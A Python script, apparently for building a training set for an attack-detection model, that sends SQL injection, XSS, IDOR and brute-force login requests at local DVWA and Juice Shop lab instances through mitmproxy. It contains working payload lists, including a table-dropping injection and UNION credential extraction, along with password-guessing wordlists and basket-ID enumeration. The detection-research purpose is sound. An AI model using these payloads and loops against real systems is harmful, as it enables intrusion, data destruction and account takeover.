"""
generate_attack_traffic.py

Sends a diverse set of SQLi, XSS, IDOR, and broken_auth traffic through
the mitmproxy capture pipeline, targeting the local DVWA and Juice Shop
instances. Goal: get each attack class into the 100+ range in
data/captured_traffic/capture_log.jsonl so scripts/extract_features.py
produces a more trainable, less imbalanced dataset.

PREREQUISITES:
  1. Docker containers running: docker start juice-shop dvwa
  2. venv active
  3. mitmdump running:  mitmdump -s capture/capture_addon.py
  4. scripts/setup_test_accounts.py already run successfully
     (produces data/captured_traffic/_test_session_state.json)

This script does NOT need Chrome -- it talks to the targets directly
via `requests`, routed through the proxy, so mitmdump captures it the
same way it captured your manual browser traffic.
"""

import json
import os
import random
import time

import requests
import urllib3

# mitmproxy uses a self-signed cert; suppress the resulting warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PROXIES = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}

JUICE_SHOP_BASE = "http://localhost:3000"
DVWA_BASE = "http://localhost:8081"

SESSION_STATE_PATH = os.path.join("data", "captured_traffic", "_test_session_state.json")

# Delay range between requests -- keeps traffic looking plausible and
# avoids tripping rate limits (especially on Juice Shop's password-reset flow)
MIN_DELAY = 0.15
MAX_DELAY = 0.5


def load_session_state():
    if not os.path.exists(SESSION_STATE_PATH):
        raise FileNotFoundError(
            f"{SESSION_STATE_PATH} not found. Run scripts/setup_test_accounts.py first."
        )
    with open(SESSION_STATE_PATH, "r", encoding="utf-8") as f:
        return json.load(f)


def sleep_briefly():
    time.sleep(random.uniform(MIN_DELAY, MAX_DELAY))


# ---------------------------------------------------------------------------
# Payload sets
# ---------------------------------------------------------------------------

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "admin'--",
    "admin' #",
    "' UNION SELECT null,null--",
    "' UNION SELECT username, password FROM users--",
    "'; DROP TABLE users--",
    "' OR 1=1--",
    "1' AND '1'='1",
    "' OR 'a'='a",
    "'/**/OR/**/1=1",
    "' OR SLEEP(5)--",
    "1 OR 1=1",
    "'||'1'='1",
    "%27%20OR%20%271%27%3D%271",  # URL-encoded ' OR '1'='1
    "%27--",  # URL-encoded '--
    "1%27%20UNION%20SELECT%20null--",  # URL-encoded UNION SELECT
    "' OR '1'='1'/*",
    "\" OR \"1\"=\"1",
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "\"><script>alert(1)</script>",
    "<body onload=alert('XSS')>",
    "<iframe src=javascript:alert(1)>",
    "<ScRiPt>alert(1)</sCriPt>",
    "'\"--></style></script><script>alert(1)</script>",
    "%3Cscript%3Ealert(1)%3C/script%3E",  # URL-encoded <script>alert(1)</script>
    "<img src=x onerror=%61lert(1)>",  # partially encoded onerror payload
    "<a href=javascript:alert(1)>click</a>",
    "<input onfocus=alert(1) autofocus>",
    "<marquee onstart=alert(1)>",
    "<div onmouseover=alert(1)>hover</div>",
]

DVWA_BRUTE_USERNAMES = ["admin", "gordonb", "1337", "pablo", "smithy", "root", "test"]
DVWA_BRUTE_PASSWORDS = [
    "password", "123456", "letmein", "admin123", "qwerty",
    "abc123", "monkey", "dragon", "iloveyou", "welcome",
]

JUICE_SHOP_BROKEN_AUTH_EMAILS = [
    "admin@juice-sh.op", "jim@juice-sh.op", "bender@juice-sh.op",
    "amy@juice-sh.op", "morty@juice-sh.op", "chris@juice-sh.op",
]
JUICE_SHOP_WRONG_PASSWORDS = ["wrongpass1", "wrongpass2", "12345678", "letmein99"]


# ---------------------------------------------------------------------------
# SQLi generation
# ---------------------------------------------------------------------------

def generate_sqli_traffic(dvwa_cookies):
    print("\n=== Generating SQLi traffic ===")
    count = 0

    # DVWA SQLi page (low security) -- classic id parameter injection
    for payload in SQLI_PAYLOADS:
        for _ in range(3):  # repeat each payload a few times across the page
            try:
                requests.get(
                    f"{DVWA_BASE}/vulnerabilities/sqli/",
                    params={"id": payload, "Submit": "Submit"},
                    cookies=dvwa_cookies,
                    proxies=PROXIES,
                    verify=False,
                    timeout=10,
                )
                count += 1
            except requests.RequestException as e:
                print(f"  [DVWA sqli] request failed: {e}")
            sleep_briefly()

    # Juice Shop search bar -- reflected in query, common SQLi target in labs
    for payload in SQLI_PAYLOADS:
        try:
            requests.get(
                f"{JUICE_SHOP_BASE}/rest/products/search",
                params={"q": payload},
                proxies=PROXIES,
                verify=False,
                timeout=10,
            )
            count += 1
        except requests.RequestException as e:
            print(f"  [Juice Shop search] request failed: {e}")
        sleep_briefly()

    # Juice Shop login endpoint -- classic SQLi-in-login-form target
    for payload in SQLI_PAYLOADS:
        try:
            requests.post(
                f"{JUICE_SHOP_BASE}/rest/user/login",
                json={"email": payload, "password": payload},
                proxies=PROXIES,
                verify=False,
                timeout=10,
            )
            count += 1
        except requests.RequestException as e:
            print(f"  [Juice Shop login sqli] request failed: {e}")
        sleep_briefly()

    print(f"SQLi requests sent: {count}")
    return count


# ---------------------------------------------------------------------------
# XSS generation
# ---------------------------------------------------------------------------

def generate_xss_traffic(dvwa_cookies):
    print("\n=== Generating XSS traffic ===")
    count = 0

    # DVWA reflected XSS
    for payload in XSS_PAYLOADS:
        for _ in range(3):
            try:
                requests.get(
                    f"{DVWA_BASE}/vulnerabilities/xss_r/",
                    params={"name": payload},
                    cookies=dvwa_cookies,
                    proxies=PROXIES,
                    verify=False,
                    timeout=10,
                )
                count += 1
            except requests.RequestException as e:
                print(f"  [DVWA xss_r] request failed: {e}")
            sleep_briefly()

    # DVWA stored XSS (guestbook-style form)
    for payload in XSS_PAYLOADS:
        try:
            requests.post(
                f"{DVWA_BASE}/vulnerabilities/xss_s/",
                data={"txtName": "tester", "mtxMessage": payload, "btnSign": "Sign Guestbook"},
                cookies=dvwa_cookies,
                proxies=PROXIES,
                verify=False,
                timeout=10,
            )
            count += 1
        except requests.RequestException as e:
            print(f"  [DVWA xss_s] request failed: {e}")
        sleep_briefly()

    # Juice Shop search bar with XSS payloads
    for payload in XSS_PAYLOADS:
        try:
            requests.get(
                f"{JUICE_SHOP_BASE}/rest/products/search",
                params={"q": payload},
                proxies=PROXIES,
                verify=False,
                timeout=10,
            )
            count += 1
        except requests.RequestException as e:
            print(f"  [Juice Shop search xss] request failed: {e}")
        sleep_briefly()

    print(f"XSS requests sent: {count}")
    return count


# ---------------------------------------------------------------------------
# IDOR generation
# ---------------------------------------------------------------------------

def generate_idor_traffic(juice_token, own_basket_id, id_range=range(1, 121)):
    print("\n=== Generating IDOR traffic ===")
    count = 0
    headers = {"Authorization": f"Bearer {juice_token}"}

    for basket_id in id_range:
        if basket_id == own_basket_id:
            continue  # skip our own basket -- not IDOR if it's actually ours
        try:
            requests.get(
                f"{JUICE_SHOP_BASE}/rest/basket/{basket_id}",
                headers=headers,
                proxies=PROXIES,
                verify=False,
                timeout=10,
            )
            count += 1
        except requests.RequestException as e:
            print(f"  [Juice Shop basket {basket_id}] request failed: {e}")
        sleep_briefly()

    print(f"IDOR requests sent: {count}")
    return count


# ---------------------------------------------------------------------------
# broken_auth generation
# ---------------------------------------------------------------------------

def generate_broken_auth_traffic(dvwa_cookies):
    print("\n=== Generating broken_auth traffic ===")
    count = 0

    # DVWA Brute Force page -- no rate limiting, best volume source
    for username in DVWA_BRUTE_USERNAMES:
        for password in DVWA_BRUTE_PASSWORDS:
            try:
                requests.get(
                    f"{DVWA_BASE}/vulnerabilities/brute/",
                    params={"username": username, "password": password, "Login": "Login"},
                    cookies=dvwa_cookies,
                    proxies=PROXIES,
                    verify=False,
                    timeout=10,
                )
                count += 1
            except requests.RequestException as e:
                print(f"  [DVWA brute] request failed: {e}")
            sleep_briefly()

    # Juice Shop failed logins (wrong password -> 401)
    for email in JUICE_SHOP_BROKEN_AUTH_EMAILS:
        for password in JUICE_SHOP_WRONG_PASSWORDS:
            try:
                requests.post(
                    f"{JUICE_SHOP_BASE}/rest/user/login",
                    json={"email": email, "password": password},
                    proxies=PROXIES,
                    verify=False,
                    timeout=10,
                )
                count += 1
            except requests.RequestException as e:
                print(f"  [Juice Shop failed login] request failed: {e}")
            sleep_briefly()

    # Juice Shop security-question endpoint -- rate limited, so go slow
    # and accept whatever volume we get here.
    print("  Hitting security-question endpoint (rate-limited, going slowly)...")
    for email in JUICE_SHOP_BROKEN_AUTH_EMAILS:
        try:
            requests.get(
                f"{JUICE_SHOP_BASE}/rest/user/security-question",
                params={"email": email},
                proxies=PROXIES,
                verify=False,
                timeout=10,
            )
            count += 1
        except requests.RequestException as e:
            print(f"  [Juice Shop security-question] request failed: {e}")
        time.sleep(2.0)  # extra-slow to respect rate limiting

    print(f"broken_auth requests sent: {count}")
    return count


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def decode_own_basket_id(token):
    """Best-effort decode of the JWT 'bid' claim, mirroring extract_features.py."""
    import base64

    try:
        payload_b64 = token.split(".")[1]
        padding = "=" * (-len(payload_b64) % 4)
        payload_json = base64.urlsafe_b64decode(payload_b64 + padding)
        payload = json.loads(payload_json)
        return payload.get("bid")
    except Exception:
        return None


def main():
    state = load_session_state()
    juice_token = state["juice_shop"]["token"]
    dvwa_cookies = state["dvwa"]["cookies"]

    own_basket_id = decode_own_basket_id(juice_token)
    print(f"Own Juice Shop basket id: {own_basket_id}")
    if own_basket_id is None:
        print("WARNING: could not decode own basket id from token. IDOR requests will "
              "still be sent, but there's a small chance one hits your own basket id "
              "and won't count as cross-owner access.")

    total = 0
    total += generate_sqli_traffic(dvwa_cookies)
    total += generate_xss_traffic(dvwa_cookies)
    total += generate_idor_traffic(juice_token, own_basket_id)
    total += generate_broken_auth_traffic(dvwa_cookies)

    print(f"\nDone. Total requests sent: {total}")
    print("Now stop mitmdump (Ctrl+C) and re-run scripts/extract_features.py "
          "to see the updated label distribution.")


if __name__ == "__main__":
    main()
